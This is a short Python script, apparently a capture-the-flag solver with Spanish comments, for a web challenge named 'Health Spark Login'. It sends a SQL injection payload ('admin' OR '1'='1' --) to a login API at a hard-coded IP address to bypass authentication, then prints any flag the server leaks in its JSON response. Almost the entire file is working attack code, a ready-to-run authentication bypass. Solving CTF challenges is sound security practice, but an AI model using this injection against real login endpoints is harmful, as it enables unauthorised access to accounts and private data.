#!/usr/bin/env python3
# Solver - Health Spark Login (Information Disclosure) - Web
# Manda la SQLi al /api/login y saca la flag que el server filtra en la respuesta.

import requests

URL = "http://45.79.200.170:3000/api/login"

payload = {
    "username": "admin' OR '1'='1' -- ",
    "password": "x",
}


def main():
    r = requests.post(URL, json=payload, timeout=10)
    print("Status:", r.status_code)

    try:
        data = r.json()
    except ValueError:
        print("La respuesta no es JSON:")
        print(r.text)
        return

    for k, v in data.items():
        print(f"  {k}: {v}")

    if data.get("flag"):
        print("\nFlag:", data["flag"])
    else:
        print("\nNo apareció la flag en la respuesta.")


if __name__ == "__main__":
    main()
